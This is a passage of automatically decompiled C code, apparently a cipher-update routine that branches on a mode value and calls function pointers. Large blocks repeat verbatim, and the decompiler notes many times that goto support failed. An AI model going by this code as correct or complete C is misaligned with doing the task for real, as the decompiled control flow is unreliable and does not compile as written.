                                                    // branch -> 0x8069efd
                                                }
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            v99 = v27;
                                            v98 = v43;
                                        }
                                    } else {
                                        v99 = v27;
                                        v98 = v43;
                                    }
                                } else {
                                    // 0x806a090
                                    v67 = v24;
                                    // branch -> 0x806a0ae
                                    // 0x806a0ae
                                    g5 = v27 - v67;
                                    g4 = g3 + 20;
                                    *(int32_t *)(g2 - 44) = v67;
                                    memcpy(v23, v22, (int32_t)v21);
                                    v15 = (int32_t *)(g3 + 36);
                                    *v15 = *v15 + *(int32_t *)(g2 - 44);
                                    v29 = g5;
                                    g237 = v29 == 0;
                                    if (v29 == 0) {
                                        // 0x806a1a8
                                        g1 = 0;
                                        // branch -> 0x8069efd
                                    } else {
                                        // 0x806a0d9
                                        *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                        v45 = g3;
                                        v18 = *(int32_t *)(v45 + 8);
                                        v99 = g5;
                                        v98 = v45;
                                        // branch -> 0x806a0e1
                                        // 0x806a0e1
                                        v46 = g2;
                                        v68 = *(int32_t *)(v46 - 28);
                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                        *(int32_t *)(v46 - 32) = v69;
                                        v47 = g2;
                                        v70 = *(int32_t *)(v47 - 60);
                                        g6 = v70;
                                        v72 = *(int32_t *)(v47 - 32);
                                        g4 = v72;
                                        v73 = *(int32_t *)(g3 + 60);
                                        g1 = v73;
                                        v89 = *(int32_t *)(v72 + 8);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                        if (g1 == 0) {
                                            // 0x806a11b
                                            v16 = (int32_t *)g7;
                                            *v16 = g5 + *v16;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                                // 0x806a0e1
                                v46 = g2;
                                v68 = *(int32_t *)(v46 - 28);
                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                *(int32_t *)(v46 - 32) = v69;
                                v47 = g2;
                                v70 = *(int32_t *)(v47 - 60);
                                g6 = v70;
                                v72 = *(int32_t *)(v47 - 32);
                                g4 = v72;
                                v73 = *(int32_t *)(g3 + 60);
                                g1 = v73;
                                v89 = *(int32_t *)(v72 + 8);
                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                if (g1 == 0) {
                                    // 0x806a11b
                                    v16 = (int32_t *)g7;
                                    *v16 = g5 + *v16;
                                    // branch -> 0x8069efd
                                }
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        } else {
                            // 0x8069fd5
                            v50 = v35 + 20;
                            *v10 = v50;
                            v30 = v18;
                            v20 = *(int32_t *)(*(int32_t *)(v36 - 36) + 24) - v30;
                            g4 = v20;
                            g237 = v50 + v30 == 0;
                            *(int32_t *)(g2 - 44) = v20;
                            memcpy(v23, v22, (int32_t)v21);
                            v31 = *(int32_t *)g3;
                            *(int32_t *)(g2 - 36) = *(int32_t *)(v31 + 28);
                            v37 = g2;
                            v58 = *(int32_t *)(v37 - 28);
                            v59 = *(int32_t *)(v37 - 32);
                            v38 = g3;
                            v60 = *(int32_t *)(v31 + 24);
                            v61 = *(int32_t *)(v37 - 36);
                            g6 = v61;
                            v62 = *(int32_t *)(v38 + 8);
                            v63 = *(int32_t *)(v38 + 60);
                            g1 = v63;
                            v88 = *(int32_t *)(v61 + 8);
                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v88)(v63, v62, v60, v38 + 40, v59, v58);
                            v39 = g2;
                            g4 = *(int32_t *)(v39 - 44);
                            if (g1 == 0) {
                                // 0x806a03d
                                v19 = *(int32_t *)g3;
                                *(int32_t *)(v39 - 32) = *(int32_t *)g7;
                                v26 = v19;
                                *(int32_t *)(g2 - 36) = v26;
                                if (v26 == 0) {
                                    // 0x806a03d
                                    v64 = 0;
                                    // branch -> 0x806a050
                                } else {
                                    // 0x806a04d
                                    v64 = *(int32_t *)(v19 + 24);
                                    // branch -> 0x806a050
                                }
                                // 0x806a050
                                v40 = g2;
                                *(int32_t *)g7 = *(int32_t *)(v40 - 32) + v64;
                                v41 = g2;
                                v85 = 0;
                                if (*(int32_t *)(v40 - 36) != 0) {
                                    // 0x806a05e
                                    v85 = *(int32_t *)(*(int32_t *)(v41 - 36) + 24);
                                    // branch -> 0x806a064
                                }
                                // 0x806a064
                                v11 = (int32_t *)(v41 - 28);
                                *v11 = *v11 + v85;
                                v32 = g4;
                                g5 -= v32;
                                v12 = (int32_t *)(g2 - 60);
                                *v12 = *v12 + v32;
                                *(int32_t *)(g3 + 36) = 0;
                                // branch -> 0x806a073
                                // 0x806a073
                                if (g5 == 0) {
                                    // 0x806a1a8
                                    g1 = 0;
                                    // branch -> 0x8069efd
                                } else {
                                    // 0x806a07b
                                    v42 = g2;
                                    v13 = (int32_t *)(v42 - 36);
                                    v18 = *v13;
                                    *(int32_t *)(v42 - 40) = *v13;
                                    v28 = 0;
                                    if (v18 != 0) {
                                        // 0x806a08a
                                        v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                        // branch -> 0x806a090
                                    }
                                    // 0x806a090
                                    v27 = g5;
                                    v24 = v27 % v28;
                                    if (v24 == 0) {
                                        // 0x806a09a
                                        v43 = g3;
                                        v65 = *(int32_t *)(v43 + 8);
                                        v18 = v65;
                                        g237 = v65 == 0;
                                        if (v65 == 0) {
                                            // 0x806a0a1
                                            v44 = g2;
                                            v14 = (int32_t *)(v44 - 36);
                                            v66 = *v14;
                                            g237 = v66 == 0;
                                            if (v66 != 0) {
                                                // 0x806a0a8
                                                v67 = *(int32_t *)(*v14 + 24);
                                                // branch -> 0x806a0ae
                                                // 0x806a0ae
                                                g5 = v27 - v67;
                                                g4 = v43 + 20;
                                                *(int32_t *)(v44 - 44) = v67;
                                                memcpy(v23, v22, (int32_t)v21);
                                                v15 = (int32_t *)(g3 + 36);
                                                *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                v29 = g5;
                                                g237 = v29 == 0;
                                                if (v29 == 0) {
                                                    // 0x806a1a8
                                                    g1 = 0;
                                                    // branch -> 0x8069efd
                                                } else {
                                                    // 0x806a0d9
                                                    *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                    v45 = g3;
                                                    v18 = *(int32_t *)(v45 + 8);
                                                    v99 = g5;
                                                    v98 = v45;
                                                    // branch -> 0x806a0e1
                                                    // 0x806a0e1
                                                    v46 = g2;
                                                    v68 = *(int32_t *)(v46 - 28);
                                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                    *(int32_t *)(v46 - 32) = v69;
                                                    v47 = g2;
                                                    v70 = *(int32_t *)(v47 - 60);
                                                    g6 = v70;
                                                    v72 = *(int32_t *)(v47 - 32);
                                                    g4 = v72;
                                                    v73 = *(int32_t *)(g3 + 60);
                                                    g1 = v73;
                                                    v89 = *(int32_t *)(v72 + 8);
                                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                                    if (g1 == 0) {
                                                        // 0x806a11b
                                                        v16 = (int32_t *)g7;
                                                        *v16 = g5 + *v16;
                                                        // branch -> 0x8069efd
                                                    }
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                v99 = v27;
                                                v98 = v43;
                                            }
                                        } else {
                                            v99 = v27;
                                            v98 = v43;
                                        }
                                    } else {
                                        // 0x806a090
                                        v67 = v24;
                                        // branch -> 0x806a0ae
                                        // 0x806a0ae
                                        g5 = v27 - v67;
                                        g4 = g3 + 20;
                                        *(int32_t *)(g2 - 44) = v67;
                                        memcpy(v23, v22, (int32_t)v21);
                                        v15 = (int32_t *)(g3 + 36);
                                        *v15 = *v15 + *(int32_t *)(g2 - 44);
                                        v29 = g5;
                                        g237 = v29 == 0;
                                        if (v29 == 0) {
                                            // 0x806a1a8
                                            g1 = 0;
                                            // branch -> 0x8069efd
                                        } else {
                                            // 0x806a0d9
                                            *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                            v45 = g3;
                                            v18 = *(int32_t *)(v45 + 8);
                                            v99 = g5;
                                            v98 = v45;
                                            // branch -> 0x806a0e1
                                            // 0x806a0e1
                                            v46 = g2;
                                            v68 = *(int32_t *)(v46 - 28);
                                            v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                            *(int32_t *)(v46 - 32) = v69;
                                            v47 = g2;
                                            v70 = *(int32_t *)(v47 - 60);
                                            g6 = v70;
                                            v72 = *(int32_t *)(v47 - 32);
                                            g4 = v72;
                                            v73 = *(int32_t *)(g3 + 60);
                                            g1 = v73;
                                            v89 = *(int32_t *)(v72 + 8);
                                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                            if (g1 == 0) {
                                                // 0x806a11b
                                                v16 = (int32_t *)g7;
                                                *v16 = g5 + *v16;
                                                // branch -> 0x8069efd
                                            }
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x806a0e1
                                    v46 = g2;
                                    v68 = *(int32_t *)(v46 - 28);
                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                    *(int32_t *)(v46 - 32) = v69;
                                    v47 = g2;
                                    v70 = *(int32_t *)(v47 - 60);
                                    g6 = v70;
                                    v72 = *(int32_t *)(v47 - 32);
                                    g4 = v72;
                                    v73 = *(int32_t *)(g3 + 60);
                                    g1 = v73;
                                    v89 = *(int32_t *)(v72 + 8);
                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                    if (g1 == 0) {
                                        // 0x806a11b
                                        v16 = (int32_t *)g7;
                                        *v16 = g5 + *v16;
                                        // branch -> 0x8069efd
                                    }
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        }
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    } else {
                        // 0x8069f50
                        g237 = v86 == 3;
                        if (v86 == 3) {
                            // 0x806a1b0
                            v77 = *(int32_t *)(v36 - 28);
                            g4 = v77;
                            v78 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                            g1 = v78;
                            v79 = *(int32_t *)(v36 - 60);
                            v48 = g3;
                            v80 = *(int32_t *)(v48 + 8);
                            v81 = *(int32_t *)(v48 + 60);
                            g6 = v81;
                            v91 = *(int32_t *)(v78 + 12);
                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v91)(v81, v80, g5, v48 + 36, v48 + 40, v79, v77);
                            if (g1 != 0) {
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        } else {
                            // 0x8069f5a
                            g237 = v86 == 5;
                            if (v86 == 5) {
                                // 0x8069f64
                                v51 = *(int32_t *)(v36 - 28);
                                v52 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                g1 = v52;
                                v53 = *(int32_t *)(v36 - 60);
                                g4 = v53;
                                v34 = g3;
                                v54 = *(int32_t *)(v34 + 60);
                                g6 = v54;
                                v87 = *(int32_t *)(v52 + 16);
                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v87)(v54, g5, v34 + 36, v34 + 40, v34 + 20, v53, v51);
                                if (g1 == 0) {
                                    // 0x8069fa2
                                    *(int32_t *)g7 = g5;
                                    // branch -> 0x8069efd
                                }
                            } else {
                                // 0x806a140
                                g237 = v86 == 7;
                                g1 = -0x6080;
                                if (v86 == 7) {
                                    // 0x806a14f
                                    v74 = *(int32_t *)(v36 - 28);
                                    g4 = v74;
                                    v75 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                    g1 = v75;
                                    v76 = *(int32_t *)(g3 + 60);
                                    g6 = v76;
                                    v90 = *(int32_t *)(v75 + 20);
                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t))v90)(v76, g5, *(int32_t *)(v36 - 60), v74);
                                    if (g1 == 0) {
                                        // 0x806a178
                                        *(int32_t *)g7 = g5;
                                        // branch -> 0x8069efd
                                    }
                                }
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                        // 0x8069fa2
                        *(int32_t *)g7 = g5;
                        // branch -> 0x8069efd
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
                // 0x806a25c
                if (*(int32_t *)(g3 + 36) == 0) {
                    // 0x806a266
                    v49 = g2;
                    v84 = *(int32_t *)(v49 - 36);
                    g4 = v84;
                    if (g5 % *(int32_t *)(v84 + 24) == 0) {
                        v36 = v49;
                        v21 = v1;
                        v22 = a2;
                        v23 = a1;
                        // 0x8069f4a
                        v10 = (int32_t *)(v36 - 32);
                        v86 = *v10;
                        if (v86 == 2) {
                            // 0x8069fb0
                            v35 = g3;
                            v55 = *(int32_t *)(v35 + 8);
                            if (v55 == 0) {
                                // 0x8069fbb
                                v56 = *(int32_t *)(v35 + 36);
                                v18 = v56;
                                v57 = *(int32_t *)(v36 - 36);
                                g4 = v57;
                                if (g5 + v56 <= *(int32_t *)(v57 + 24)) {
                                    // 0x806a205
                                    memcpy(v23, v22, (int32_t)v21);
                                    g1 = 0;
                                    v17 = (int32_t *)(g3 + 36);
                                    *v17 = g5 + *v17;
                                    // branch -> 0x8069efd
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                } else {
                                    v25 = v56;
                                }
                            } else {
                                // 0x806a128
                                v82 = *(int32_t *)(v35 + 36);
                                v18 = v82;
                                if (v55 == 1) {
                                    // 0x806a1f3
                                    v83 = *(int32_t *)(v36 - 36);
                                    g4 = v83;
                                    if (g5 + v82 < *(int32_t *)(v83 + 24)) {
                                        // 0x806a205
                                        memcpy(v23, v22, (int32_t)v21);
                                        g1 = 0;
                                        v17 = (int32_t *)(g3 + 36);
                                        *v17 = g5 + *v17;
                                        // branch -> 0x8069efd
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    } else {
                                        v25 = v82;
                                    }
                                } else {
                                    v25 = v82;
                                }
                            }
                            // 0x8069fcd
                            if (v25 == 0) {
                                // 0x806a073
                                if (g5 == 0) {
                                    // 0x806a1a8
                                    g1 = 0;
                                    // branch -> 0x8069efd
                                } else {
                                    // 0x806a07b
                                    v42 = g2;
                                    v13 = (int32_t *)(v42 - 36);
                                    v18 = *v13;
                                    *(int32_t *)(v42 - 40) = *v13;
                                    v28 = 0;
                                    if (v18 != 0) {
                                        // 0x806a08a
                                        v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                        // branch -> 0x806a090
                                    }
                                    // 0x806a090
                                    v27 = g5;
                                    v24 = v27 % v28;
                                    if (v24 == 0) {
                                        // 0x806a09a
                                        v43 = g3;
                                        v65 = *(int32_t *)(v43 + 8);
                                        v18 = v65;
                                        g237 = v65 == 0;
                                        if (v65 == 0) {
                                            // 0x806a0a1
                                            v44 = g2;
                                            v14 = (int32_t *)(v44 - 36);
                                            v66 = *v14;
                                            g237 = v66 == 0;
                                            if (v66 != 0) {
                                                // 0x806a0a8
                                                v67 = *(int32_t *)(*v14 + 24);
                                                // branch -> 0x806a0ae
                                                // 0x806a0ae
                                                g5 = v27 - v67;
                                                g4 = v43 + 20;
                                                *(int32_t *)(v44 - 44) = v67;
                                                memcpy(v23, v22, (int32_t)v21);
                                                v15 = (int32_t *)(g3 + 36);
                                                *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                v29 = g5;
                                                g237 = v29 == 0;
                                                if (v29 == 0) {
                                                    // 0x806a1a8
                                                    g1 = 0;
                                                    // branch -> 0x8069efd
                                                } else {
                                                    // 0x806a0d9
                                                    *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                    v45 = g3;
                                                    v18 = *(int32_t *)(v45 + 8);
                                                    v99 = g5;
                                                    v98 = v45;
                                                    // branch -> 0x806a0e1
                                                    // 0x806a0e1
                                                    v46 = g2;
                                                    v68 = *(int32_t *)(v46 - 28);
                                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                    *(int32_t *)(v46 - 32) = v69;
                                                    v47 = g2;
                                                    v70 = *(int32_t *)(v47 - 60);
                                                    g6 = v70;
                                                    v72 = *(int32_t *)(v47 - 32);
                                                    g4 = v72;
                                                    v73 = *(int32_t *)(g3 + 60);
                                                    g1 = v73;
                                                    v89 = *(int32_t *)(v72 + 8);
                                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                                    if (g1 == 0) {
                                                        // 0x806a11b
                                                        v16 = (int32_t *)g7;
                                                        *v16 = g5 + *v16;
                                                        // branch -> 0x8069efd
                                                    }
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                v99 = v27;
                                                v98 = v43;
                                            }
                                        } else {
                                            v99 = v27;
                                            v98 = v43;
                                        }
                                    } else {
                                        // 0x806a090
                                        v67 = v24;
                                        // branch -> 0x806a0ae
                                        // 0x806a0ae
                                        g5 = v27 - v67;
                                        g4 = g3 + 20;
                                        *(int32_t *)(g2 - 44) = v67;
                                        memcpy(v23, v22, (int32_t)v21);
                                        v15 = (int32_t *)(g3 + 36);
                                        *v15 = *v15 + *(int32_t *)(g2 - 44);
                                        v29 = g5;
                                        g237 = v29 == 0;
                                        if (v29 == 0) {
                                            // 0x806a1a8
                                            g1 = 0;
                                            // branch -> 0x8069efd
                                        } else {
                                            // 0x806a0d9
                                            *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                            v45 = g3;
                                            v18 = *(int32_t *)(v45 + 8);
                                            v99 = g5;
                                            v98 = v45;
                                            // branch -> 0x806a0e1
                                            // 0x806a0e1
                                            v46 = g2;
                                            v68 = *(int32_t *)(v46 - 28);
                                            v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                            *(int32_t *)(v46 - 32) = v69;
                                            v47 = g2;
                                            v70 = *(int32_t *)(v47 - 60);
                                            g6 = v70;
                                            v72 = *(int32_t *)(v47 - 32);
                                            g4 = v72;
                                            v73 = *(int32_t *)(g3 + 60);
                                            g1 = v73;
                                            v89 = *(int32_t *)(v72 + 8);
                                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                            if (g1 == 0) {
                                                // 0x806a11b
                                                v16 = (int32_t *)g7;
                                                *v16 = g5 + *v16;
                                                // branch -> 0x8069efd
                                            }
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x806a0e1
                                    v46 = g2;
                                    v68 = *(int32_t *)(v46 - 28);
                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                    *(int32_t *)(v46 - 32) = v69;
                                    v47 = g2;
                                    v70 = *(int32_t *)(v47 - 60);
                                    g6 = v70;
                                    v72 = *(int32_t *)(v47 - 32);
                                    g4 = v72;
                                    v73 = *(int32_t *)(g3 + 60);
                                    g1 = v73;
                                    v89 = *(int32_t *)(v72 + 8);
                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                    if (g1 == 0) {
                                        // 0x806a11b
                                        v16 = (int32_t *)g7;
                                        *v16 = g5 + *v16;
                                        // branch -> 0x8069efd
                                    }
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            } else {
                                // 0x8069fd5
                                v50 = v35 + 20;
                                *v10 = v50;
                                v30 = v18;
                                v20 = *(int32_t *)(*(int32_t *)(v36 - 36) + 24) - v30;
                                g4 = v20;
                                g237 = v50 + v30 == 0;
                                *(int32_t *)(g2 - 44) = v20;
                                memcpy(v23, v22, (int32_t)v21);
                                v31 = *(int32_t *)g3;
                                *(int32_t *)(g2 - 36) = *(int32_t *)(v31 + 28);
                                v37 = g2;
                                v58 = *(int32_t *)(v37 - 28);
                                v59 = *(int32_t *)(v37 - 32);
                                v38 = g3;
                                v60 = *(int32_t *)(v31 + 24);
                                v61 = *(int32_t *)(v37 - 36);
                                g6 = v61;
                                v62 = *(int32_t *)(v38 + 8);
                                v63 = *(int32_t *)(v38 + 60);
                                g1 = v63;
                                v88 = *(int32_t *)(v61 + 8);
                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v88)(v63, v62, v60, v38 + 40, v59, v58);
                                v39 = g2;
                                g4 = *(int32_t *)(v39 - 44);
                                if (g1 == 0) {
                                    // 0x806a03d
                                    v19 = *(int32_t *)g3;
                                    *(int32_t *)(v39 - 32) = *(int32_t *)g7;
                                    v26 = v19;
                                    *(int32_t *)(g2 - 36) = v26;
                                    if (v26 == 0) {
                                        // 0x806a03d
                                        v64 = 0;
                                        // branch -> 0x806a050
                                    } else {
                                        // 0x806a04d
                                        v64 = *(int32_t *)(v19 + 24);
                                        // branch -> 0x806a050
                                    }
                                    // 0x806a050
                                    v40 = g2;
                                    *(int32_t *)g7 = *(int32_t *)(v40 - 32) + v64;
                                    v41 = g2;
                                    v85 = 0;
                                    if (*(int32_t *)(v40 - 36) != 0) {
                                        // 0x806a05e
                                        v85 = *(int32_t *)(*(int32_t *)(v41 - 36) + 24);
                                        // branch -> 0x806a064
                                    }
                                    // 0x806a064
                                    v11 = (int32_t *)(v41 - 28);
                                    *v11 = *v11 + v85;
                                    v32 = g4;
                                    g5 -= v32;
                                    v12 = (int32_t *)(g2 - 60);
                                    *v12 = *v12 + v32;
                                    *(int32_t *)(g3 + 36) = 0;
                                    // branch -> 0x806a073
                                    // 0x806a073
                                    if (g5 == 0) {
                                        // 0x806a1a8
                                        g1 = 0;
                                        // branch -> 0x8069efd
                                    } else {
                                        // 0x806a07b
                                        v42 = g2;
                                        v13 = (int32_t *)(v42 - 36);
                                        v18 = *v13;
                                        *(int32_t *)(v42 - 40) = *v13;
                                        v28 = 0;
                                        if (v18 != 0) {
                                            // 0x806a08a
                                            v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                            // branch -> 0x806a090
                                        }
                                        // 0x806a090
                                        v27 = g5;
                                        v24 = v27 % v28;
                                        if (v24 == 0) {
                                            // 0x806a09a
                                            v43 = g3;
                                            v65 = *(int32_t *)(v43 + 8);
                                            v18 = v65;
                                            g237 = v65 == 0;
                                            if (v65 == 0) {
                                                // 0x806a0a1
                                                v44 = g2;
                                                v14 = (int32_t *)(v44 - 36);
                                                v66 = *v14;
                                                g237 = v66 == 0;
                                                if (v66 != 0) {
                                                    // 0x806a0a8
                                                    v67 = *(int32_t *)(*v14 + 24);
                                                    // branch -> 0x806a0ae
                                                    // 0x806a0ae
                                                    g5 = v27 - v67;
                                                    g4 = v43 + 20;
                                                    *(int32_t *)(v44 - 44) = v67;
                                                    memcpy(v23, v22, (int32_t)v21);
                                                    v15 = (int32_t *)(g3 + 36);
                                                    *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                    v29 = g5;
                                                    g237 = v29 == 0;
                                                    if (v29 == 0) {
                                                        // 0x806a1a8
                                                        g1 = 0;
                                                        // branch -> 0x8069efd
                                                    } else {
                                                        // 0x806a0d9
                                                        *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                        v45 = g3;
                                                        v18 = *(int32_t *)(v45 + 8);
                                                        v99 = g5;
                                                        v98 = v45;
                                                        // branch -> 0x806a0e1
                                                        // 0x806a0e1
                                                        v46 = g2;
                                                        v68 = *(int32_t *)(v46 - 28);
                                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                        *(int32_t *)(v46 - 32) = v69;
                                                        v47 = g2;
                                                        v70 = *(int32_t *)(v47 - 60);
                                                        g6 = v70;
                                                        v72 = *(int32_t *)(v47 - 32);
                                                        g4 = v72;
                                                        v73 = *(int32_t *)(g3 + 60);
                                                        g1 = v73;
                                                        v89 = *(int32_t *)(v72 + 8);
                                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                                        if (g1 == 0) {
                                                            // 0x806a11b
                                                            v16 = (int32_t *)g7;
                                                            *v16 = g5 + *v16;
                                                            // branch -> 0x8069efd
                                                        }
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    v99 = v27;
                                                    v98 = v43;
                                                }
                                            } else {
                                                v99 = v27;
                                                v98 = v43;
                                            }
                                        } else {
                                            // 0x806a090
                                            v67 = v24;
                                            // branch -> 0x806a0ae
                                            // 0x806a0ae
                                            g5 = v27 - v67;
                                            g4 = g3 + 20;
                                            *(int32_t *)(g2 - 44) = v67;
                                            memcpy(v23, v22, (int32_t)v21);
                                            v15 = (int32_t *)(g3 + 36);
                                            *v15 = *v15 + *(int32_t *)(g2 - 44);
                                            v29 = g5;
                                            g237 = v29 == 0;
                                            if (v29 == 0) {
                                                // 0x806a1a8
                                                g1 = 0;
                                                // branch -> 0x8069efd
                                            } else {
                                                // 0x806a0d9
                                                *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                v45 = g3;
                                                v18 = *(int32_t *)(v45 + 8);
                                                v99 = g5;
                                                v98 = v45;
                                                // branch -> 0x806a0e1
                                                // 0x806a0e1
                                                v46 = g2;
                                                v68 = *(int32_t *)(v46 - 28);
                                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                *(int32_t *)(v46 - 32) = v69;
                                                v47 = g2;
                                                v70 = *(int32_t *)(v47 - 60);
                                                g6 = v70;
                                                v72 = *(int32_t *)(v47 - 32);
                                                g4 = v72;
                                                v73 = *(int32_t *)(g3 + 60);
                                                g1 = v73;
                                                v89 = *(int32_t *)(v72 + 8);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                                if (g1 == 0) {
                                                    // 0x806a11b
                                                    v16 = (int32_t *)g7;
                                                    *v16 = g5 + *v16;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x806a0e1
                                        v46 = g2;
                                        v68 = *(int32_t *)(v46 - 28);
                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                        *(int32_t *)(v46 - 32) = v69;
                                        v47 = g2;
                                        v70 = *(int32_t *)(v47 - 60);
                                        g6 = v70;
                                        v72 = *(int32_t *)(v47 - 32);
                                        g4 = v72;
                                        v73 = *(int32_t *)(g3 + 60);
                                        g1 = v73;
                                        v89 = *(int32_t *)(v72 + 8);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                        if (g1 == 0) {
                                            // 0x806a11b
                                            v16 = (int32_t *)g7;
                                            *v16 = g5 + *v16;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        } else {
                            // 0x8069f50
                            g237 = v86 == 3;
                            if (v86 == 3) {
                                // 0x806a1b0
                                v77 = *(int32_t *)(v36 - 28);
                                g4 = v77;
                                v78 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                g1 = v78;
                                v79 = *(int32_t *)(v36 - 60);
                                v48 = g3;
                                v80 = *(int32_t *)(v48 + 8);
                                v81 = *(int32_t *)(v48 + 60);
                                g6 = v81;
                                v91 = *(int32_t *)(v78 + 12);
                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v91)(v81, v80, g5, v48 + 36, v48 + 40, v79, v77);
                                if (g1 != 0) {
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            } else {
                                // 0x8069f5a
                                g237 = v86 == 5;
                                if (v86 == 5) {
                                    // 0x8069f64
                                    v51 = *(int32_t *)(v36 - 28);
                                    v52 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                    g1 = v52;
                                    v53 = *(int32_t *)(v36 - 60);
                                    g4 = v53;
                                    v34 = g3;
                                    v54 = *(int32_t *)(v34 + 60);
                                    g6 = v54;
                                    v87 = *(int32_t *)(v52 + 16);
                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v87)(v54, g5, v34 + 36, v34 + 40, v34 + 20, v53, v51);
                                    if (g1 == 0) {
                                        // 0x8069fa2
                                        *(int32_t *)g7 = g5;
                                        // branch -> 0x8069efd
                                    }
                                } else {
                                    // 0x806a140
                                    g237 = v86 == 7;
                                    g1 = -0x6080;
                                    if (v86 == 7) {
                                        // 0x806a14f
                                        v74 = *(int32_t *)(v36 - 28);
                                        g4 = v74;
                                        v75 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                        g1 = v75;
                                        v76 = *(int32_t *)(g3 + 60);
                                        g6 = v76;
                                        v90 = *(int32_t *)(v75 + 20);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t))v90)(v76, g5, *(int32_t *)(v36 - 60), v74);
                                        if (g1 == 0) {
                                            // 0x806a178
                                            *(int32_t *)g7 = g5;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x8069fa2
                            *(int32_t *)g7 = g5;
                            // branch -> 0x8069efd
                        }
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
            }
            // 0x8069ef8
            g1 = -0x6100;
